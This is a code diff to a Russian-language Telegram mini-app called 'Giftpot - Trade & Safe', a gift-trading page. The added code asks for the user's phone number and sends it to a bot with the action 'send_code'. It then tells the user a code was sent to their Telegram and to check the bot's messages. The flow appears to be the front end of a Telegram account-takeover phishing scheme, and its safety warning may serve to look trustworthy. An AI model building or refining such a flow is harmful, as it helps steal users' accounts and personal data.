@@ -81,6 +81,10 @@
             box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4);
         }
         
+        .btn:active {
+            transform: translateY(0);
+        }
+        
         .btn:disabled {
             background: #cbd5e1;
             cursor: not-allowed;
@@ -115,8 +119,8 @@
         .loader {
             width: 48px;
             height: 48px;
-            border: 4px solid rgba(255,255,255,0.2);
-            border-top-color: white;
+            border: 4px solid rgba(59, 130, 246, 0.2);
+            border-top-color: #3b82f6;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 24px auto;
@@ -139,6 +143,25 @@
         input:focus {
             outline: none;
             border-color: #3b82f6;
+        }
+
+        .warning {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            color: #92400e;
+        }
+
+        .cancel-btn {
+            background: #64748b;
+            margin-top: 8px;
+        }
+
+        .cancel-btn:hover {
+            background: #475569;
         }
     </style>
 </head>
@@ -166,7 +189,7 @@
             <h1>Giftpot - Trade & Safe</h1>
             <p class="subtitle">Здесь начинается мир продажи и<br>обмена подарками</p>
             
-            <button class="btn" onclick="requestPhone()">
+            <button class="btn" onclick="startAuth()">
                 <svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24">
                     <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                 </svg>
@@ -174,6 +197,30 @@
             </button>
             
             <p style="margin-top: 24px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
+        </div>
+
+        <!-- Phone Input Step -->
+        <div id="phone-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+                <ellipse cx="100" cy="100" rx="35" ry="8" fill="none" stroke="black" stroke-width="2"/>
+            </svg>
+            
+            <h1>Номер телефона</h1>
+            <p class="subtitle">Введите ваш номер в формате<br>+1234567890</p>
+            
+            <div class="warning">
+                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
+            </div>
+            
+            <input type="tel" id="phone-input" placeholder="+1234567890" />
+            
+            <button class="btn" onclick="submitPhone()">Отправить код</button>
+            <button class="btn cancel-btn" onclick="showStep('welcome-step')">Отмена</button>
         </div>
 
         <!-- Loading Step -->
@@ -195,7 +242,7 @@
         <div id="success-step" class="step">
             <div class="success-icon">✅</div>
             <h1>Успешно!</h1>
-            <p class="subtitle">Вы успешно авторизованы</p>
+            <p class="subtitle">Код отправлен в ваш Telegram.<br>Проверьте сообщения от бота.</p>
         </div>
     </div>
 
@@ -205,41 +252,86 @@
         tg.expand();
         tg.MainButton.hide();
 
+        let phoneNumber = '';
+
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
         }
 
-        function requestPhone() {
-            // Используем встроенную функцию Telegram для запроса номера
-            tg.requestContact((contact) => {
-                if (contact && contact.phone_number) {
-                    handlePhoneReceived(contact.phone_number);
+        function startAuth() {
+            // Проверяем, запущено ли в настоящем Telegram
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                // Пытаемся использовать встроенную функцию Telegram
+                if (typeof tg.requestContact === 'function') {
+                    tg.requestContact((shared) => {
+                        if (shared) {
+                            // Успешно получили номер через системный диалог
+                            // Telegram сам отправит данные боту
+                            showStep('loading-step');
+                            setTimeout(() => {
+                                showStep('success-step');
+                                setTimeout(() => tg.close(), 2000);
+                            }, 2000);
+                        } else {
+                            // Пользователь отказался - показываем ручной ввод
+                            showStep('phone-step');
+                        }
+                    });
                 } else {
-                    tg.showAlert('Не удалось получить номер телефона');
+                    // Функция недоступна - ручной ввод
+                    showStep('phone-step');
                 }
-            });
+            } else {
+                // Запущено вне Telegram - ручной ввод
+                showStep('phone-step');
+            }
         }
 
-        function handlePhoneReceived(phone) {
+        function submitPhone() {
+            const input = document.getElementById('phone-input');
+            phoneNumber = input.value.trim();
+            
+            // Базовая валидация
+            if (!phoneNumber.startsWith('+') || phoneNumber.length < 10) {
+                if (tg.showAlert) {
+                    tg.showAlert('Введите номер в формате +1234567890');
+                } else {
+                    alert('Введите номер в формате +1234567890');
+                }
+                return;
+            }
+
             showStep('loading-step');
             
-            // Отправляем номер боту
+            // Отправляем данные боту
             tg.sendData(JSON.stringify({
                 action: 'send_code',
-                phone: phone
+                phone: phoneNumber
             }));
 
-            // Показываем успех через 2 секунды
+            // Показываем успех
             setTimeout(() => {
                 showStep('success-step');
                 
-                // Закрываем мини-апп через 2 секунды
+                // Закрываем через 3 секунды
                 setTimeout(() => {
                     tg.close();
-                }, 2000);
+                }, 3000);
             }, 2000);
         }
+
+        // Обработка Enter в поле ввода
+        document.addEventListener('DOMContentLoaded', () => {
+            const phoneInput = document.getElementById('phone-input');
+            if (phoneInput) {
+                phoneInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        submitPhone();
+                    }
+                });
+            }
+        });
     </script>
 </body>
 </html>
